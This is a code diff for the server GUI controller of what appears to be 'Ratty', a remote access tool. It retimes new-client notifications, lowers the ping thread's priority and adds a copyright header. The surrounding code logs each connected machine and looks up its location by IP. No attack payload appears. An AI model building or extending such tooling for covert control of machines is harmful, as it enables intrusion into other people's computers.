@@ -1,3 +1,7 @@
+/*
+ * Copyright 2016 Johannes Boczek
+ */
+
 package de.sogomn.rat.gui.server;
 
 import static de.sogomn.rat.util.Constants.LANGUAGE;
@@ -75,7 +79,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	private File selectedBuilderFile;
-	private long lastNotification;
+	private long lastServerStart;
 	
 	private static final String BUILDER_DATA_REPLACEMENT = "data";
 	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s:%s";
@@ -137,7 +141,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	private static final long PING_INTERVAL = 5000;
-	private static final long NOTIFICATION_INTERVAL = 5000;
+	private static final long NOTIFICATION_DELAY = 7500;
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
@@ -166,6 +170,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		fileChooser.setCurrentDirectory(Constants.JAR_FILE);
 		serverList.addListener(this);
 		
+		pingThread.setPriority(Thread.MIN_PRIORITY);
 		pingThread.setDaemon(true);
 		pingThread.start();
 	}
@@ -918,7 +923,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String version = packet.getVersion();
 		final String address = client.getAddress();
 		final ImageIcon icon = getFlagIcon(address);
-		final boolean shouldNotify = System.currentTimeMillis() - lastNotification > NOTIFICATION_INTERVAL;
+		final boolean shouldNotify = System.currentTimeMillis() - lastServerStart > NOTIFICATION_DELAY;
 		
 		client.logIn(name, os, version, icon);
 		client.addListener(this);
@@ -931,8 +936,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 			
 			notification.trigger();
 			PING.play();
-			
-			lastNotification = System.currentTimeMillis();
 		}
 	}
 	
@@ -946,6 +949,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		if (!contains) {
 			serverList.addListEntry(portString);
 			serverList.setPortInput("");
+			
+			lastServerStart = System.currentTimeMillis();
 		}
 	}
 	
